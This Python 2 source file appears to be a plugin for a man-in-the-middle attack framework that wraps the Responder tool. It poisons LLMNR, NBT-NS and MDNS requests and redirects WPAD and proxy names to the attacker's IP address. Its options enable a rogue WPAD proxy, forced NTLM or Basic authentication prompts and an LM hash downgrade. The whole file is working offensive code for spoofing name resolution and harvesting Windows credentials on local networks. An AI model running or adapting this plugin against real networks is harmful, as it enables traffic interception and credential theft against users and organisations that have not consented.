from plugins.plugin import Plugin
from libs.responder.Responder import start_responder
from libs.sslstrip.DnsCache import DnsCache
from twisted.internet import reactor
import sys
import os
import threading

class Responder(Plugin):
    name     = "Responder"
    optname  = "responder"
    desc     = "Poison LLMNR, NBT-NS and MDNS requests"
    version  = "0.2"
    has_opts = True
    req_root = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface

        RESP_VERSION = "2.1.2"

        try:
            config = options.configfile['Responder']
        except Exception, e:
            sys.exit('[-] Error parsing config for Responder: ' + str(e))

        DnsCache.getInstance().setCustomAddress(options.ip_address)

        for name in ['wpad', 'ISAProxySrv', 'RespProxySrv']:
            DnsCache.getInstance().setCustomRes(name, options.ip_address)

        print "|  |_ NBT-NS, LLMNR & MDNS Responder v%s by Laurent Gaffie online" % RESP_VERSION

        if options.Analyse:
            print '|  |_ Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned'

        t = threading.Thread(name='responder', target=start_responder, args=(options, options.ip_address, config))
        t.setDaemon(True)
        t.start()

    def plugin_reactor(self, strippingFactory):
        reactor.listenTCP(3141, strippingFactory)

    def add_options(self, options):
        options.add_argument('--analyze', dest="Analyse", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
        options.add_argument('--verbose', dest="Verbose", default=False, action="store_true", help="More verbose")
